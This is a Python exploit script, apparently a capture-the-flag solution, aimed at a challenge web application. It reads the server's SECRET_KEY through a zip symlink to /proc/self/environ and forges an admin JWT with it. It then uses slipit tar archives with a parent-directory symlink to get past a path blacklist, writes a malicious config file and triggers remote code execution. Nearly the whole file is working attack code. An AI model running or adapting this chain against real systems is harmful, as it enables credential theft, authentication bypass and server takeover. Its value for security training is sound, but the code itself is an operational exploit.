import json
from pathlib import Path
import re
import requests
import jwt
from urllib.parse import urljoin
import subprocess
import re
import os

# URL = "http://localhost:8000/"
URL = "http://samehadaku.intechfest.cc/"

EXPLOIT_FILE_NAME = "exploit.conf.yaml"


def execute_slipit(text, filepath):
    tmpdir = "exploit.tar"
    if Path(tmpdir).exists():
        os.unlink(tmpdir)
    dirname = os.path.dirname(filepath)
    filename = os.path.basename(filepath)
    command = [
        'slipit',
        '--archive-type', 'tar',
        tmpdir,
        filename,
        '--prefix', dirname,
        '--static', text,
        '--separator', '/',
        '--depth', '0',
        '--overwrite'
    ]
    subprocess.check_output(command)
    return tmpdir


def make_zip_symlink(filename, linkto):
    zipname = "exploit.zip"
    if Path(zipname).exists():
        os.unlink(zipname)
    subprocess.check_output(['ln', '-s', linkto, filename])
    command = [
        'zip', '--symlinks', '-r', zipname, filename
    ]
    subprocess.check_output(command)
    os.remove(filename)
    return zipname


def extract_secret_key(environ_string):
    pattern = b'SECRET_KEY=(.*?)\x00'
    secret_key_match = re.search(pattern, environ_string)
    if secret_key_match:
        return secret_key_match.group(1)
    return None


def forge_token(username, is_admin, configfile, secret_key):
    creds = json.dumps({
        "username": username,
        "isAdmin": is_admin,
        "configfile": configfile
    })
    jwt_cookie_dat = {
        "sub": creds,
        "type": "access",
    }
    token = jwt.encode(jwt_cookie_dat, secret_key, algorithm='HS256')
    return token


class ExploitApi:
    def __init__(self, url=URL) -> None:
        self.url = url
        self.session = requests.Session()

    def path(s, path):
        return urljoin(s.url, path)

    def uploadtar(s, tarfile):
        """
        require login as admin
        """
        res = s.session.post(s.path("/uploadtar"), files={
            "file": open(tarfile)
        })
        return res

    def uploadzip(s, zipfile):
        res = s.session.post(s.path("/uploadzip"), files={
            "file": open(zipfile, "rb")
        })
        return res

    def forge_and_set_cookie(s, username, is_admin, configfile, secret_key):
        token = forge_token(username, is_admin, configfile, secret_key)
        s.session.cookies.set(
            name='access_token_cookie',
            value=token.decode(),
        )

    def read_upload(s, filename):
        return s.session.get(s.path(str(filename)))

    def get_secret(s):
        """
        get SECRET_KEY from environtment variable
        """
        filename = "foobarfoo"
        zipfilename = make_zip_symlink(filename, "/proc/self/environ")
        uploaded_filename = Path(s.uploadzip(zipfilename).json()['filename'])
        environ = s.read_upload(uploaded_filename/filename).content
        return extract_secret_key(environ)

    def upload_exploit(s):
        """
        upload exploit.conf.yaml into the config folder using arbitary file write
        and bypass the waf using symlink to create a link to parent directory
        """
        os.environ['payload'] = open("./"+EXPLOIT_FILE_NAME).read()
        # path transversal using symlink, because the blacklist only
        # blacklisted the path name, we can usign symlink to path transfersal to parent directory.
        os.system('slipit exploit.tar link --symlink ../ --overwrite --depth 0')
        s.uploadtar("exploit.tar")
        os.system(f'slipit exploit.tar {EXPLOIT_FILE_NAME} --prefix "link/config" --separator / --static "$payload" --depth 0 --overwrite')
        return s.uploadtar("exploit.tar")

    def triger_rce(s):
        return s.session.get(s.path("/"))


if __name__ == "__main__":
    api = ExploitApi()
    secret_key = api.get_secret()
    print("secret:", secret_key)
    api.forge_and_set_cookie(
        username="dimas",
        is_admin=True,
        configfile=EXPLOIT_FILE_NAME,
        secret_key=secret_key
    )
    res = api.upload_exploit()
    print(res.text)
    api.triger_rce()
